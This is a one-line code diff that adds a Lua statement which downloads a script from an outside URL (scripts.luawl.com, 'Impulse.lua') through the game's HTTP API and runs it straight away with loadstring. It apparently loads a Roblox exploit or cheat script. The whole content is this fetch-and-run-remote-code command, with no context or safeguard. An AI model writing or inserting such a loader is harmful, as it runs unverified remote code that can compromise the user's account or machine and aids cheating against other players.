@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/15670/Impulse.lua'))()
